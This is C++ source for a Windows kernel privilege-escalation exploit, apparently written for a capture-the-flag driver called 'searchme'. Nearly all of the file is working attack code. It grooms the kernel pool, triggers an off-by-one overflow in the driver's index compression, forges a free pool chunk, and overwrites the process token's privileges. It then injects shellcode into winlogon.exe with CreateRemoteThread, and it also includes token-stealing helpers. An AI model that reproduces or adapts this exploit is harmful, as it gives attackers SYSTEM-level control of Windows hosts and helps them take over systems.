#pragma comment (linker, "/defaultlib:ntdll.lib")

#include "stdafx.h"
#include <Windows.h>
#include <subauth.h>
#include <Winuser.h>
#include <direct.h>
#include <tlhelp32.h>

#include "common.h"
#include "shellcode.h"

namespace {

typedef struct _ii_posting_list {
	char token[16];
	size_t size, capacity;
} ii_posting_list;

HANDLE connect() {
	HANDLE h = CreateFileA("\\\\.\\searchme", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, NULL, NULL);
	if (h == INVALID_HANDLE_VALUE)
		winerror("Could not open searchme device");
	return h;
}

void ioctl(int code, void* inbuf, DWORD inbufsize, void* outbuf, DWORD* outbufsize) {
	HANDLE h = connect();
	if (!DeviceIoControl(h, code, inbuf, inbufsize, outbuf, outbufsize ? *outbufsize : 0, outbufsize, NULL))
		winerror("IoControl");
}

void ioctl_expect_error(int code, void* inbuf, DWORD inbufsize, void* outbuf, DWORD* outbufsize) {
	HANDLE h = connect();
	if (DeviceIoControl(h, code, inbuf, inbufsize, outbuf, outbufsize ? *outbufsize : 0, outbufsize, NULL)) {
		printf("Expected error from ioctl, but got none\n");
		exit(1);
	}
}

ULONG64 kalloc(ULONG64 sz) {
	ULONG64 out;
	DWORD outsz = 8;
	ioctl(0x224CDC, &sz, 8, &out, &outsz);
	return out;
}

void kfree(ULONG64 ptr) {
	ULONG64 out;
	DWORD outsz = 8;
	ioctl(0x224CE4, &ptr, 8, &out, &outsz);
}

void kwrite(ULONG64 where, void* what, DWORD whatlen) {
	char *buf = new char[whatlen + 8];
	memcpy(buf, &where, 8);
	memcpy(buf + 8, what, whatlen);
	ULONG64 out;
	DWORD outsz = 8;
	ioctl(0x224CE0, buf, whatlen + 8, &out, &outsz);
}

HANDLE make_keyed_event() {
	HANDLE res;
	NtCreateKeyedEvent(&res, -1, NULL, 0);
	return res;
}

HANDLE make_directory_obj() {
	HANDLE res;
	NtCreateDirectoryObject(&res, 0, NULL);
	return res;
}

constexpr int NUM_HANDLES = 1000;

typedef ULONG64 IDXHANDLE;

IDXHANDLE elgoog_create_index() {
	IDXHANDLE h;
	DWORD outsz = sizeof h;
	ioctl(0x222000, 0, 0, &h, &outsz);
	return h;
}
void elgoog_add_to_index(IDXHANDLE h, UINT32 docid, const char* s) {
	DWORD insz = (DWORD)(strlen(s) + sizeof h + sizeof docid);
	char *req = new char[insz];
	memcpy(req, &h, sizeof h);
	memcpy(req + sizeof h, &docid, sizeof docid);
	memcpy(req + sizeof h + sizeof docid, s, strlen(s));
	ioctl(0x222008, req, insz, 0, 0);
}

void elgoog_debug_index(IDXHANDLE h) {
	ioctl(0x222014, &h, sizeof h, 0, 0);
}

void elgoog_close_index(IDXHANDLE h) {
	ioctl(0x222004, &h, sizeof h, 0, 0);
}

IDXHANDLE elgoog_compress_index(IDXHANDLE h) {
	DWORD sz = sizeof h;
	ioctl(0x22200C, &h, sizeof h, &h, &sz);
	return h;
}

void elgoog_compress_index_overflow(IDXHANDLE h) {
	DWORD sz = sizeof h;
	ioctl_expect_error(0x22200C, &h, sizeof h, &h, &sz);
}

ULONG64 get_handle_addr(HANDLE h) {
	ULONG len = 20;
	NTSTATUS status = (NTSTATUS)0xc0000004;
	PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = NULL;
	do {
		len *= 2;
		pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)GlobalAlloc(GMEM_ZEROINIT, len);

		status = NtQuerySystemInformation(SystemExtendedHandleInformation, pHandleInfo, len, &len);

	} while (status == (NTSTATUS)0xc0000004);
	if (status != (NTSTATUS)0x0) {
		printf("NtQuerySystemInformation failed with error code 0x%X\n", status);
		return 1;
	}

	DWORD mypid = GetProcessId(GetCurrentProcess());
	ULONG64 ptrs[NUM_HANDLES] = { 0 };
	for (int i = 0; i < pHandleInfo->HandleCount; i++) {
		PVOID object = pHandleInfo->Handles[i].Object;
		HANDLE handle = pHandleInfo->Handles[i].HandleValue;
		DWORD pid = (DWORD)pHandleInfo->Handles[i].UniqueProcessId;
		if (pid != mypid)
			continue;
		if (handle == h)
			return (ULONG64)object;
	}
	return -1;
}

HPALETTE pal1, pal2;
ULONG64 pal1_addr, pal2_addr;

void set_addr(ULONG64 addr) {
	SetPaletteEntries(pal2, 0, sizeof addr / 4, (const PALETTEENTRY*)&addr);
}

void write(ULONG64 where, ULONG64 what) {
	set_addr(where);
	SetPaletteEntries(pal1, 0, sizeof what / 4, (const PALETTEENTRY*)&what);
}

ULONG64 read(ULONG64 where) {
	set_addr(where);
	ULONG64 res;
	GetPaletteEntries(pal1, 0, sizeof res / 4, (PALETTEENTRY*)&res);
	return res;
}

void steal_token(ULONG64 eprocess) {
	/*
	0: kd> dt _EPROCESS UniqueProcessId ActiveProcessLinks Token
	nt!_EPROCESS
	+0x2e0 UniqueProcessId    : Ptr64 Void
	+0x2e8 ActiveProcessLinks : _LIST_ENTRY
	+0x358 Token              : _EX_FAST_REF
	*/
	ULONG64 cur = eprocess;
	while (read(cur + 0x2e0) != 4) {
		cur = read(cur + 0x2e8) - 0x2e8;
	}
	printf("SYSTEM proc @ %llx\n", cur);
	printf("my proc @ %llx\n", eprocess);
	write(eprocess + 0x358, read(cur + 0x358));
}

void payload() {
	FILE* f;
	fopen_s(&f, "C:\\token.txt", "rb");
	char buf[1024];
	buf[fread(buf, 1, 1024, f)] = 0;
	printf("%s\n", buf);

	/*
	_chdir("C:\\");
	system("cmd");
	*/
}

LPVOID alloc_at(LPVOID addr, DWORD size) {
	return VirtualAlloc(addr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
}

void test_shellcode() {
	void* f = VirtualAlloc(0, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(f, shellcode, shellcode_len);
	(*(void(*)())f)();
}

void inject() {
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	int pid = -1;
	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			if (lstrcmpiW(entry.szExeFile, L"winlogon.exe") == 0)
			{
				pid = entry.th32ProcessID;
				break;
			}
		}
	}

	CloseHandle(snapshot);

	if (pid < 0) {
		printf("Could not find process\n");
		return;
	}

	HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (!h) {
		winerror("Could not open process");
	}
	printf("process=%d\n", h);
	void* mem = VirtualAllocEx(h, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	printf("remote mem @ %p\n", mem);
	if (!mem)
		winerror("remote allocation failed");
	if (!WriteProcessMemory(h, mem, shellcode, shellcode_len, 0))
		winerror("remote write failed");
	CreateRemoteThread(h, NULL, 0, (LPTHREAD_START_ROUTINE)mem, 0, 0, 0);
}

void exploit() {
	HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
	HANDLE token;
	OpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES, &token);
	printf("proc=%d token=%d\n", proc, token);
	ULONG64 ktoken = get_handle_addr(token);
	printf("kproc=%p ktoken=%p\n", get_handle_addr(proc), ktoken);
	LOG("kproc=%p ktoken=%p\n", get_handle_addr(proc), ktoken);

	// location of SEP_TOKEN_PRIVILEGES token member. We will overwrite this
	// with a bunch of 1 bits to elevate privileges.
	ULONG64 where = ktoken + 0x40;

	// Just some token with hash % 3 = 2
	const char* hashtoken = "pwnd";

	// Allocate some memory where our fake blink/flink free list pointers will point.
	char* alloc1 = (char*)alloc_at((void*)0x000010000000000, 0x1000);
	char* alloc2 = (char*)alloc_at((void*)0x000000001000000, 0x10000);
	if (alloc1 != (char*)0x000010000000000 || alloc2 != (char*)0x000000001000000) {
		printf("fail! cannot allocate\n");
		exit(1);
	}
	ULONG64* fake_blink = (ULONG64*)(alloc1 + 8);
	ULONG64* fake_flink = (ULONG64*)(alloc2 + 0x6300);

	// Allocate a fake ii_posting_list that points to the location we want to overwrite.
	// Once we can corrupt an ii_token_table to point to it, we get an arbitrary write
	// when it is appended to.
	ULONG64 fake_pl_loc = 0x133700000000;

	ii_posting_list *fake_pl = (ii_posting_list*)alloc_at((void*)fake_pl_loc, 0x1000);
	if ((ULONG64)fake_pl != fake_pl_loc) {
		printf("fail! could not allocate at %p.\n", fake_pl_loc);
		exit(1);
	}
	ULONG64 fake_pl_data = fake_pl_loc + 0x20;
	memcpy(fake_pl->token, hashtoken, strlen(hashtoken));
	if ((where - fake_pl_data) % 4 != 0) {
		printf("fail! where - fake_pl_data not aligned.\n");
		exit(1);
	}
	fake_pl->size = (where - fake_pl_data) / 4;
	fake_pl->capacity = fake_pl->size + 0x10;

	ULONG32 lo = fake_pl_loc & 0xffffffff;
	ULONG32 hi = (fake_pl_loc >> 32) & 0xffffffff;
	// The order is important, because we will place the pointer inside a posting
	// list, which is kept sorted.
	if (lo >= hi) {
		printf("fail! lo/hi is wrong.\n");
		exit(1);
	}

	// idx_XXX will compress to a pool chunk size of 0xXXX
	IDXHANDLE idx_40 = elgoog_create_index();
	IDXHANDLE idx_1c0 = elgoog_create_index();
	IDXHANDLE idx_400 = elgoog_create_index();
	IDXHANDLE idx_660 = elgoog_create_index();
	IDXHANDLE idx_f70 = elgoog_create_index();
	IDXHANDLE idx_almost_full_toktab = elgoog_create_index();
	IDXHANDLE idx_overflow = elgoog_create_index();
	IDXHANDLE idx_220 = elgoog_create_index();

	// compressed(idx) chunk has size 0x220
	elgoog_add_to_index(idx_220, 1,
		"aa ba ca da ea fa ga ha ia ja ka la ma na oa pa qa ra sa ta ua va wa xa ya za "
		"ab bb cb db eb fb gb hb");

	elgoog_add_to_index(idx_40, 1, "a b");

	// 0x1c0
	int fake_sz = 0x91;
	elgoog_add_to_index(idx_1c0, 0, "bbbb c d e f g h i j k l m n o p q r s t u v w x y z caaa da");
	elgoog_add_to_index(idx_1c0, 1, "bbbb");
	elgoog_add_to_index(idx_1c0, 0x01010101, "aaa");
	// Fake (free) pool header with BlockSize 0x91
	// blink/flink pointers will point to fake_blink/fake_flink
	elgoog_add_to_index(idx_1c0, 0x100 + (fake_sz << 16), "aaa");

	elgoog_add_to_index(idx_f70, 1,
		"aaaaa baaa ca da ea fa ga ha ia ja ka la ma na oa pa qa ra sa ta u v w x y z "
		"bb bb cb db eb fb gb hb ib jb kb lb mb nb ob pb qb rb sb tb ub vb wb xb yb zb "
		"cc bc cc dc ec fc gc hc ic jc kc lc mc nc oc pc qc rc sc tc uc vc wc xc yc zc "
		"dd bd  dd ed fd gd hd id jd kd ld md nd od pd qd rd sd td ud vd wd xd yd zd "
		"ee be  de ee fe ge he ie je ke le me ne oe pe qe re se te ue ve we xe ye ze "
		"ff bf cf df ef ff gf hf if jf kf lf mf nf of pf qf rf sf tf uf vf wf xf yf zf "
		"gg bg cg dg eg fg gg hg ig jg kg lg mg ng og pg qg rg sg tg ug vg wg xg yg zg "
		"hh bh ch dh eh fh gh hh ih jh kh lh mh nh oh ph qh rh sh th uh vh wh xh yh zh "
		"ii bi ci di ei fi gi hi ii ji ki li mi ni oi pi qi ri si ti ui vi wi xi yi zi "
		"jj bj cj dj ej fj gj hj ij jj kj lj mj nj oj pj qj rj sj tj uj vj wj xj yj zj "
		"kk bk ck dk ek fk gk hk ik jk kk "
	);
	elgoog_add_to_index(idx_f70, 0, "ddd");
	elgoog_add_to_index(idx_f70, 1, "ddd");
	elgoog_add_to_index(idx_f70, 2, "ddd");
	// The uncompressed posting list will contain the fake_pl_loc pointer
	elgoog_add_to_index(idx_f70, lo, "dddddde");
	elgoog_add_to_index(idx_f70, hi, "dddddde");


	elgoog_add_to_index(idx_400, 1,
		"aa ba ca da ea fa ga ha ia ja ka la ma na oa pa qa ra sa ta ua va wa xa ya za "
		"bb bb cb db eb fb gb hb ib jb kb lb mb nb ob pb qb rb sb tb ub vb wb xb yb zb "
		"cc bc cc dc ec fc gc hc ic jc kc lc mc nc oc pc"
	);

	elgoog_add_to_index(idx_660, 1,
		"aa ba ca da ea fa ga ha ia ja ka la ma na oa pa qa ra sa ta ua va wa xa ya za "
		"ab bb cb db eb fb gb hb ib jb kb lb mb nb ob pb qb rb sb tb ub vb wb xb yb zb "
		"ac bc cc dc ec fc gc hc ic jc kc lc mc nc oc pc qc rc sc tc uc vc wc xc yc zc "
		"ad bd cd dd ed fd gd hd id jd kd ld md nd od pd qd rd sd td ud vd wd xd yd zd "
		"ae be ce"
	);

	// The ii_token_table for this index will have chunk size 0x120. After one more
	// element is added it will get reallocated to size 0x220
	elgoog_add_to_index(idx_almost_full_toktab, 1, "a b c d e f g h i j k l m n o p");

	// Allocation size = 0x1c0. This will trigger the off-by-one write and 
	// overflow one 0x91 byte into the next chunk
	elgoog_add_to_index(idx_overflow, 0,
		"aaaaa caaaa da ea fa ga ha ia ja ka la ma na oa pa qa ra sa ta ua va wa"
		"ab cb db eb"
	);
	elgoog_add_to_index(idx_overflow, 1, "x");
	elgoog_add_to_index(idx_overflow, 0, "x");
	elgoog_add_to_index(idx_overflow, 1, "x");

	elgoog_add_to_index(idx_overflow, 1, "y");
	elgoog_add_to_index(idx_overflow, 2, "y");
	elgoog_add_to_index(idx_overflow, 5, "y");
	elgoog_add_to_index(idx_overflow, 6, "y");
	elgoog_add_to_index(idx_overflow, 10, "y");
	elgoog_add_to_index(idx_overflow, 14, "y");
	elgoog_add_to_index(idx_overflow, 32, "y");
	elgoog_add_to_index(idx_overflow, 87, "y");
	elgoog_add_to_index(idx_overflow, 117, "y");
	elgoog_add_to_index(idx_overflow, 119, "y");
	elgoog_add_to_index(idx_overflow, 120, "y");

	// Close holes of many possible sizes
	for (int i = 0; i < 300; ++i)
		make_keyed_event(); // 0x660
	for (int i = 0; i < 1000; ++i)
		make_directory_obj();
	for (int i = 0; i < 100; ++i)
		elgoog_compress_index(idx_400);

	// Prepare some chunks that we can free later to clear out deferred free list
	IDXHANDLE tofree[400];
	for (int i = 0; i < 400; ++i)
		tofree[i] = elgoog_compress_index(idx_220);

	// Exhaust LAL for size 0x40
	LOG("spraying 40\n");
	for (int i = 0; i < 260; ++i)
		elgoog_compress_index(idx_40);

	IDXHANDLE allocs[1000];
	int allocidx=0;
	ULONG64 a, b, c=0, d, e;

	// The layout we want for out pool page with pool header offsets:
	//
	// a                       @ offset 0          (size 0x1c0)
	//      fake free chunk    @ offset 0x90
	// e = padding             @ offset 0x1c0      (size 0x400)
	// d = ii_token_table      @ offset 0x5c0      (size 0x220)
	// c = overflowing chunk   @ offset 0x7e0      (size 0x1c0)
	// b                       @ offset 0x9a0      (size 0x660)
	//
	// Ignore the fact that c is not called as such below and the order of variables 
	// is messed up :) This exploit is a goddamn mess.
	//
	// Also, note that there are 4 paged pools that we allocate from in a round-robin
	// fashion, so we have to skip 3 allocations in between our target allocations.
	while (((a = allocs[allocidx++] = elgoog_compress_index(idx_1c0)) & 0xfff) != 0x010)
		;
	allocs[allocidx - 1];
	for (int i = 0; i < 3; ++i)
		allocs[allocidx++] = elgoog_compress_index(idx_1c0);
	b = allocs[allocidx++] = elgoog_compress_index(idx_660);
	for (int i = 0; i < 3; ++i)
		allocs[allocidx++] = elgoog_compress_index(idx_1c0);
	elgoog_compress_index_overflow(idx_overflow);
	for (int i = 0; i < 3; ++i)
		allocs[allocidx++] = elgoog_compress_index(idx_1c0);

	// Will allocate new token table with size 0x220, and a posting list of size 0x40
	// Both served from ListHeads because we cleared LAL
	elgoog_add_to_index(idx_almost_full_toktab, 2, "q");

	elgoog_compress_index(idx_1c0);
	elgoog_compress_index(idx_1c0);

	// Fill remaining free space because we overwrite it later and don't want allocator to crash
	e = elgoog_compress_index(idx_400);

	// Location of token table
	d = a + 0x5c0;

	if (e - a != 0x1c0 || d - a != 0x5c0 || b - a != 0x9a0) {
		// Some debugging info in case things go south
		for (int i = 0; i < 3; ++i)
			allocs[allocidx++] = elgoog_compress_index(idx_1c0);
		printf("fail!\n");

		for (int i = max(0, allocidx - 20); i < allocidx; ++i) {
			if (allocs[i] == a || allocs[i] == b || allocs[i] == c || allocs[i] == d)
				printf("=> %p\n", allocs[i]);
			else 
				printf("   %p\n", allocs[i]);
		}
		printf("a=%p\nb=%p\nc=%p\nd=%p\nidx=%p\n", a, b, c, d, idx_almost_full_toktab);
		exit(1);
	}

	LOG("a=%p\nb=%p\nc=%p\nd=%p\ne=%p\nidx=%p\n", a, b, c, d, e, idx_almost_full_toktab);

	// We forged a free chunk with BlockSize 0x91 (chunk size 0x910) at page offset 0x90.
	// Make sure the free list pointers are valid so we can survive consistency checks.
	ULONG64 fake_chunk = a - 0x10 + 0x90;
	*fake_blink = *fake_flink = fake_chunk + 0x10;
	
	// Free b chunk to trigger backward consolidation. This will merge the fake
	// chunk and b, producing a free chunk of size 0xf70, and will place it in
	// ListHeads.
	// This free chunk overlaps with the ii_token_table at offset 0x5c0 of the/ page.
	elgoog_close_index(b);

	// Trigger deferred free
	for (int i = 400-256; i < 400; i += 8) {
		for (int j = 0; j < 4; ++j) {
			elgoog_close_index(tofree[i + j]);
		}
	}

	// This will overwrite ii_token_table->slots[2] with a pointer to our fake
	// ii_posting_list
	for (int i = 0; i < 3; ++i)
		elgoog_compress_index(idx_f70);

	ULONG64 f = elgoog_compress_index(idx_f70);
	LOG("f=%p\n", f);
	if (f - a != 0x90) {
		printf("fail 2!\n");
		exit(1);
	}

	printf("a=%p\nb=%p\nc=%p\nd=%p\ne=%p\nf=%p\nidx=%p\n", a, b, c, d, e, f, idx_almost_full_toktab);

	// Overwrite token privileges by appending to fake posting list
	LOG("Done. appending.\n");
	elgoog_add_to_index(idx_almost_full_toktab, 0xffffffff, hashtoken);
	elgoog_add_to_index(idx_almost_full_toktab, 0xfffffffe, hashtoken);
	elgoog_add_to_index(idx_almost_full_toktab, 0xffffffff, hashtoken);
	elgoog_add_to_index(idx_almost_full_toktab, 0xfffffffe, hashtoken);
	LOG("Appended.\n");
}

}

int main()
{
	init_funcs();

	DWORD_PTR mask = 1;
	SetThreadAffinityMask(GetCurrentThread(), mask);
	SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

	exploit();

	SetPriorityClass(GetCurrentProcess(), NORMAL_PRIORITY_CLASS);
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);

	// We now have debug privileges and can inject code into some SYSTEM processes
	inject();

	return 0;
}

